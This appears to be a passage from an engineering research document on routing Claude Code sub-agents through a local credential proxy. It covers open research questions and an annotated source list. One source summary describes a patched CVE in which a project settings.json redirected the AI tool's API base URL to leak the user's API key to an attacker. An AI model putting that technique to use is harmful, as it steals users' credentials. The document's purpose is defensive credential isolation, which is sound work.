
### R-PROXY-B: hasCompletedOnboarding Requirement for ANTHROPIC_BASE_URL in Headless Mode [BLOCKS_IMPL]

**Question:** Issue #26935 documents that Claude Code may bypass `ANTHROPIC_BASE_URL` and contact `api.anthropic.com` directly when `hasCompletedOnboarding` is not set in the config. Does this affect fresh `CLAUDE_CONFIG_DIR` temp directories used for per-agent isolation? What is the minimal config that must be pre-written to the temp `CLAUDE_CONFIG_DIR` to prevent this bypass?

**Why this matters for M1:** If the proxy bypass occurs, the sub-agent contacts Anthropic directly, which requires `ANTHROPIC_API_KEY` to be in the env for authentication — defeating the proxy entirely. The conductor must pre-initialize `CLAUDE_CONFIG_DIR` correctly before spawning sub-agents.

**Suggested investigation:** Inspect the Claude Code source (or the settings.json structure) to identify which keys are read before the first API call in headless mode. Determine if writing `{"hasCompletedOnboarding": true}` to the temp `CLAUDE_CONFIG_DIR/settings.json` suffices.

### R-PROXY-C: Streaming SSE Correctness in the Python Proxy [V2_RESEARCH]

**Question:** Does the `aiohttp`-based proxy implementation correctly handle Server-Sent Events (SSE) streaming responses from `api.anthropic.com`? Specifically: does the proxy correctly forward chunked transfer encoding, `Content-Type: text/event-stream`, and `data:` lines in real time without buffering? Are there any frame boundaries or heartbeat packets that require special handling?

**Why this matters:** If the proxy buffers entire responses before forwarding, sub-agent sessions will appear to "freeze" until entire LLM outputs are generated. This breaks the streaming behavior that `--output-format stream-json` relies on. This is a quality/correctness concern, not a blocking security issue, hence V2_RESEARCH.

### R-PROXY-D: Proxy Cost Budget Enforcement [V2_RESEARCH]

**Question:** Can the credential proxy enforce per-agent token budgets by inspecting and counting tokens in forwarded requests? Is this feasible at the proxy layer (reading `claude-input-tokens` and `claude-output-tokens` headers in responses), or does it require parsing the response body?

**Why this matters:** The proxy holds a privileged position — it sees all API requests and responses. Budget enforcement at the proxy layer would be more reliable than relying on Claude Code's `--max-tokens` flag alone. This is a feature enhancement, not a blocking item.

### R-PROXY-E: Proxy Auth for Multi-Tenant or Team Deployments [V2_RESEARCH]

**Question:** For a multi-user conductor deployment (multiple developers sharing one conductor instance), should the proxy authenticate incoming connections from sub-agents? What is the minimal authentication mechanism (e.g., a per-session bearer token in the `Authorization` header of requests to the proxy) that prevents one user's sub-agent from using another user's API budget?

**Why this matters:** In the single-developer case, all sub-agents share the same API key, so cross-agent proxy access is acceptable. In a multi-tenant case, the proxy must enforce per-user key routing. This is a future architecture concern.

---

## Sources

- [Securely Deploying AI Agents — Claude API Docs (credential proxy pattern, ANTHROPIC_BASE_URL option)](https://platform.claude.com/docs/en/agent-sdk/secure-deployment) — Official Anthropic documentation recommending the proxy pattern; explicitly documents `ANTHROPIC_BASE_URL=http://localhost:8080` for plaintext local proxy
- [LLM Gateway Configuration — Claude Code Docs (ANTHROPIC_BASE_URL, ANTHROPIC_AUTH_TOKEN header behavior)](https://code.claude.com/docs/en/llm-gateway) — Confirms `ANTHROPIC_AUTH_TOKEN` is sent as `Authorization` header; `apiKeyHelper` sent as both `Authorization` and `X-Api-Key`; LiteLLM integration via `http://0.0.0.0:4000`
- [Caught in the Hook: RCE and API Token Exfiltration Through Claude Code Project Files — Check Point Research](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/) — CVE-2026-21852: ANTHROPIC_BASE_URL set via settings.json before trust dialog; API key sent in plaintext as X-Api-Key to attacker endpoint; patched in Claude Code 2.0.65
- [Claude Code Flaws Allow Remote Code Execution and API Key Exfiltration — The Hacker News](https://thehackernews.com/2026/02/claude-code-flaws-allow-remote-code.html) — CVE-2026-21852 summary and impact
- [CVE-2026-21852: CWE-522: Insufficiently Protected Credentials — SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2026-21852/) — CVE classification and details
- [Using Proxies to Hide Secrets from Claude Code — Formal.ai](https://formal.ai/blog/using-proxies-claude-code/) — Dummy API key + mitmproxy approach; `NODE_EXTRA_CA_CERTS` for TLS; confirms proxy pattern eliminates key from sandbox
- [Using Proxies to Hide Secrets from Claude Code — Hacker News Discussion](https://news.ycombinator.com/item?id=46605155) — Community analysis; macaroon-based credentials as alternative; skeptics on complexity tradeoffs
- [Securing Claude and Your Skills: Keeping Credentials Out of Your Agent Container — Brian Gershon](https://www.briangershon.com/blog/securing-claude-and-your-skills) — Move API credentials to separate container; agent never possesses them; HTTP endpoint only
- [Question: Credential injection proxy for Claudes in containers? — GitHub Issue #5082](https://github.com/anthropics/claude-code/issues/5082) — Community question confirming demand for proxy isolation; user solved it with a working implementation (draft PR #5490); Anthropic closed as not planned but user implementation demonstrated feasibility
- [Claude Code Proxy (OpenAI format) — GitHub 1rgs/claude-code-proxy](https://github.com/1rgs/claude-code-proxy) — Community proxy confirming ANTHROPIC_BASE_URL=http://localhost:8082 works with placeholder ANTHROPIC_API_KEY value
- [[BUG] Claude Code bypasses ANTHROPIC_BASE_URL when hasCompletedOnboarding not set — GitHub Issue #26935](https://github.com/anthropics/claude-code/issues/26935) — Documents regression where onboarding check bypasses custom base URL
- [Claude Code + Local LLMs: Proxy Guide — Medium](https://medium.com/@michael.hannecke/connecting-claude-code-to-local-llms-two-practical-approaches-faa07f474b0f) — Confirms http://localhost proxy works without TLS
- [LiteLLM + Claude Code Quickstart — LiteLLM Docs](https://docs.litellm.ai/docs/tutorials/claude_responses_api) — ANTHROPIC_BASE_URL=http://0.0.0.0:4000 with ANTHROPIC_AUTH_TOKEN=litellm-key; confirms http:// plaintext
- [Anthropic SDK Python — GitHub](https://github.com/anthropics/anthropic-sdk-python) — base_url parameter accepts http:// URLs for local proxy
- [mitmproxy Reverse Proxy Mode — mitmproxy Docs](https://docs.mitmproxy.org/stable/concepts/modes/) — `mitmweb --mode reverse:https://api.anthropic.com --listen-port 8000`; ANTHROPIC_BASE_URL=http://localhost:8000/
- [Security Threat Model — docs/research/06-security-threat-model.md](06-security-threat-model.md) — T3 (credential exposure), R-SEC-D (blast radius)
- [API Key Rotation and Credential Refresh — docs/research/11-api-key-rotation.md](11-api-key-rotation.md) — R-CRED-C (this research question), credential lifecycle, apiKeyHelper mechanics
- [Credential Proxy for gh CLI — docs/research/17-credential-proxy.md](17-credential-proxy.md) — Parallel pattern for GITHUB_TOKEN; TLS interception complexity analysis for gh CLI (does not apply to Anthropic key due to ANTHROPIC_BASE_URL plaintext path)
- [Claude Code Sandboxing Blog Post — Anthropic Engineering](https://www.anthropic.com/engineering/claude-code-sandboxing) — Unix socket architecture; proxy running outside container with credential injection
- [Enterprise Network Configuration — Claude Code Docs](https://code.claude.com/docs/en/network-config) — HTTP_PROXY/HTTPS_PROXY; custom CA certificates via NODE_EXTRA_CA_CERTS
